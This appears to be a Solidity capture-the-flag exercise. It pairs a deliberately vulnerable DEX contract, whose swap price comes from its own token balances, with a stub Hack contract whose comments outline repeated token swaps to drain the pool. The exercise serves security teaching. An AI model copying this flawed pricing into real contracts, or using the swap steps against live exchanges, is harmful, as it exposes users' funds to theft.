

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


/**
The goal of this level is for you to 
hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. 
The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, 
and allow the contract to report a "bad" price of the assets.


**/

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() {
    
  }

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance ) ERC20("name", "symbol") {
        _mint(msg.sender, 10000);
        approve(msg.sender, 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,10);
        transfer(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,10);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
    return true;
  }
}


interface DexI {
  function token1() external view returns(address);
  function token2() external view returns(address);
  function balanceOf(address token, address account) external view returns (uint);
  function swap(address from, address to, uint amount) external;
}

interface SwappableTokenI {
  function totalSupply() external view returns (uint256);
  function approve(address owner, address spender, uint256 amount) external returns(bool);
}


contract Hack {
  DexI dex;
  SwappableTokenI token1;
  constructor(address _add, address _add_token_1) {
    dex = DexI(_add);
    token1 = SwappableTokenI(_add_token_1);
  }

  function hack() public {
    // Approve Dex to transfer lot of tokens
    // Keep swapping between token1 and token2 with less than total amount. 
    // 1. await contract.approve(await contract.address, 1000);
    // 2. await contract.swap(await contract.token2(), await contract.token1(), 5);
    // 3. await contract.swap(await contract.token1(), await contract.token2(), 5);
  }

}